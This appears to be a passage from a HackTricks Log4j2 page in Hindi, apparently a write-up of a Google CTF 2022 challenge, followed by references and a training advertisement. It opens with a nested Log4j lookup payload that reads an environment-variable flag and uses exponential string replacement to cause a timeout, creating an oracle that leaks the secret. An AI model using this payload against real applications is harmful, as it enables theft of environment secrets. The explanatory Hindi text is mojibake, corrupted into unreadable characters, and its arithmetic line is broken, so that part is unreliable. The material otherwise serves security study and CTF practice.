> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> рдпрджрд┐ рдзреНрд╡рдЬ `flagGuess` рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдкреВрд░реЗ рдзреНрд╡рдЬ рдХреЛ 29 `#`-s рдХреЗ рд╕рд╛рде рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдореИрдВрдиреЗ рдЗрд╕ рдЪрд░рд┐рддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдВрднрд╡рддрдГ рдзреНрд╡рдЬ рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рдирд╣реАрдВ рд╣реЛрдЧрд╛)ред **рдкрд░рд┐рдгрд╛рдореА 29 `#`-s рдореЗрдВ рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдХреЛ рдлрд┐рд░ 54 `#`-s рд╕реЗ рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ **6 рдмрд╛рд░** рджреЛрд╣рд░рд╛рдИ рдЬрд╛рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдХреБрд▓ ` 29*54*54^6* =`` `` `**`96816014208`** **`#`-s!**
>
> рдЗрддрдиреЗ рд╕рд╛рд░реЗ `#`-s рдХреЛ рдмрджрд▓рдиреЗ рд╕реЗ Flask рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХрд╛ 10-рд╕реЗрдХрдВрдб рдХрд╛ timeout рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛, рдЬреЛ рдмрджрд▓реЗ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ HTTP рд╕реНрдерд┐рддрд┐ рдХреЛрдб 500 рднреЗрдЬреЗрдЧрд╛ред (рдпрджрд┐ рдзреНрд╡рдЬ `flagGuess` рд╕реЗ рд╢реБрд░реВ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдореЗрдВ рдПрдХ рдЧреИрд░-500 рд╕реНрдерд┐рддрд┐ рдХреЛрдб рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛)

## рд╕рдВрджрд░реНрдн

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
